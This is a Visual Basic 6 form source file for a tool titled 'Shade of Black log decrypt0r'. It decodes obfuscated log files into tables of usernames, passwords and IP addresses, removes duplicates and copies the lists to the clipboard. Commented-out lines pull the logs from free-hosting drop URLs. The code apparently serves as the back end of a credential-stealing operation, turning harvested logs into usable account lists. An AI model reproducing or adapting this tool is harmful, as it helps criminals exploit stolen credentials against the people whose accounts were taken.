VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "msinet.ocx"
Object = "{5E9E78A0-531B-11CF-91F6-C2863C385E30}#1.0#0"; "MSFLXGRD.OCX"
Begin VB.Form Form1 
   Caption         =   "Shade of Black log decrypt0r"
   ClientHeight    =   7095
   ClientLeft      =   165
   ClientTop       =   555
   ClientWidth     =   13455
   LinkTopic       =   "Form1"
   ScaleHeight     =   7095
   ScaleWidth      =   13455
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox tsrc 
      Height          =   7095
      Left            =   6480
      MultiLine       =   -1  'True
      TabIndex        =   4
      Top             =   0
      Width           =   6975
   End
   Begin MSFlexGridLib.MSFlexGrid t 
      Height          =   6735
      Left            =   0
      TabIndex        =   3
      Top             =   360
      Width           =   6495
      _ExtentX        =   11456
      _ExtentY        =   11880
      _Version        =   393216
      Rows            =   0
      Cols            =   4
      FixedRows       =   0
      ScrollBars      =   2
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Lucida Console"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.CommandButton List 
      Caption         =   "Decrypt logfile"
      Height          =   375
      Left            =   4320
      TabIndex        =   2
      Top             =   0
      Width           =   2175
   End
   Begin InetCtlsObjects.Inet nt 
      Left            =   0
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.CommandButton de 
      Caption         =   "Decrypt"
      Height          =   375
      Left            =   2160
      TabIndex        =   1
      Top             =   0
      Width           =   2175
   End
   Begin VB.CommandButton en 
      Caption         =   "Encrypt"
      Height          =   375
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   2175
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Const sp = " /// "

Private Sub En_Click()
    tmp = Clipboard.GetText
    Clipboard.Clear
    Clipboard.SetText enc(tmp)
End Sub
Private Sub De_Click()
    tmp = Clipboard.GetText
    Clipboard.Clear
    Clipboard.SetText dec(tmp)
End Sub

Private Function enc(ByVal data As String) As String
    For a = 1 To Len(data)
        tmp = Right(Left(data, a), 1)
        enc = enc & Asc(tmp) * 2 & ","
    Next a
    enc = Left(enc, Len(enc) - 1)
End Function
Private Function dec(ByVal data As String) As String
    tmp = Split(data, ",")
    For a = 0 To UBound(tmp)
        dec = dec & Chr(tmp(a) / 2)
    Next a
End Function
Function te(ByVal tx As String)
    For a = 1 To Len(tx)
        te = te & Chr(Asc(Mid$(tx, a, 1)) + 1)
    Next
End Function
Function td(ByVal tx As String)
    For a = 1 To Len(tx)
        td = td & Chr(Asc(Mid$(tx, a, 1)) - 1)
    Next
End Function

Private Sub Form_Load()
    With t
        .AddItem "Num"
        .Col = 1
        .Text = "Username"
        .Col = 2
        .Text = "Password"
        .Col = 3
        .Text = "IP Address"
        .ColWidth(0) = 400
        .ColWidth(1) = 2000
        .ColWidth(2) = 2000
        .ColWidth(3) = 2000
    End With
End Sub

Private Sub List_Click()
    infsrc = vbYes 'MsgBox("Ny nettside?", vbYesNo)
    'If infsrc = vbNo Then src = nt.OpenURL("http://nordic.110mb.com/badger/mushroom.dat")
    'If infsrc = vbYes Then src = nt.OpenURL("http://nordic.awardspace.com/wookie/sorbitol.dat")
    src = tsrc
    src = Split(src, vbCrLf)
    For a = UBound(src) - 1 To 0 Step -1
        inf = Split(src(a) & " [|] ", " [|] ")
        For b = 0 To UBound(inf) - 2
            If infsrc = vbNo Then inf(b) = dec(inf(b))
            If infsrc = vbYes Then inf(b) = td(inf(b))
        Next
        'If InStr(1, lst, inf(2), vbTextCompare) = 0 Then
        If InStr(1, lst, inf(0) & sp, vbTextCompare) = 0 Then
        'If (InStr(1, lst, inf(0) & sp, vbTextCompare) = 0) And (InStr(1, lst, inf(2), vbTextCompare) = 0) Then
            lst = lst & inf(0) & sp & inf(1) & sp & inf(3) & vbCrLf
            uCnt = uCnt + 1
            If uCnt < 100 Then
                t.AddItem uCnt: t.Row = uCnt
                t.Col = 1: t.Text = inf(0): t.CellAlignment = 0
                t.Col = 2: t.Text = inf(1): t.CellAlignment = 0
                t.Col = 3: t.Text = inf(3): t.CellAlignment = 0
                Me.Caption = uCnt & " / " & tCnt
            End If
        End If
        tCnt = tCnt + 1
        If Right(a, 2) = "00" Then Me.Caption = uCnt & " / " & tCnt: DoEvents
    Next
    Me.Caption = uCnt & " unique, " & tCnt & " total users."
    Clipboard.Clear
    Clipboard.SetText lst
End Sub

Private Sub t_Click()
    Vl = t.Row & sp
    t.Col = 1: Vl = Vl & t.Text & sp
    t.Col = 2: Vl = Vl & t.Text & sp
    t.Col = 3: Vl = Vl & t.Text
    Clipboard.Clear
    Clipboard.SetText Vl
End Sub
